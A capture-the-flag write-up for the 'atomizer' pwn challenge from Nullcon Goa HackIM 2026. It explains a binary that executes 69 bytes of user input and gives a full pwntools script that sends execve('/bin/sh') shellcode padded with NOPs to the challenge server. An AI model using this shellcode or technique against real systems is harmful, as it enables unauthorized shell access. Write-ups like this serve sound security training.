---
title: "atomizer - Nullcon Goa HackIM 2026 CTF"
category: "pwn"
subcategory: "shellcode"
type: "writeup"
tags: ["pwn", "xor", "shellcode", "pwntools", "atomizer", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "Event: Nullcon Goa HackIM 2026 CTF"
source:
  name: "CTFtime writeup #40648"
  url: "https://ctftime.org/writeup/40648"
original_source: "https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/PWN/atomizer/README.md"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "atomizer"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** atomizer
- **Author team:** RootRunners
- **CTFtime tags:** pwn
- **CTFtime:** <https://ctftime.org/writeup/40648>
- **Original writeup:** <https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/PWN/atomizer/README.md>

---
# atomizer

**Event:** Nullcon Goa HackIM 2026 CTF   
**Category:** PWN   
**Points:** 92   
**Service:** `52.59.124.14:5020`

## Overview  
The binary maps an RWX page at a fixed address (`0x7770000`), reads **exactly 69 bytes** into it, then jumps to that address. This is a straight shellcode injection challenge with a strict length requirement.

## Key Observations  
\- `mmap(0x7770000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED, ...)`  
\- Input is read in a loop until **exactly** `0x45` bytes.  
\- On success, execution jumps to `0x7770000`.

## Exploit  
Send x86-64 `execve("/bin/sh")` shellcode padded with NOPs to 69 bytes, then read the flag.

## Exploit Script (pwntools)  
```python  
#!/usr/bin/env python3  
from pwn import *

HOST = "52.59.124.14"  
PORT = 5020

io = remote(HOST, PORT)

shellcode = asm("""  
xor rsi, rsi  
xor rdx, rdx  
push rsi  
mov rdi, 0x68732f6e69622f  
push rdi  
mov rdi, rsp  
mov al, 59  
syscall  
""", arch="amd64")

REQUIRED = 0x45  
payload = shellcode.ljust(REQUIRED, b"\x90")

io.recvuntil(b"> ")  
io.send(payload)  
io.interactive()  
```

## Flag  
`ENO{GIVE_ME_THE_RIGHT_AMOUNT_OF_ATOMS_TO_WIN}`
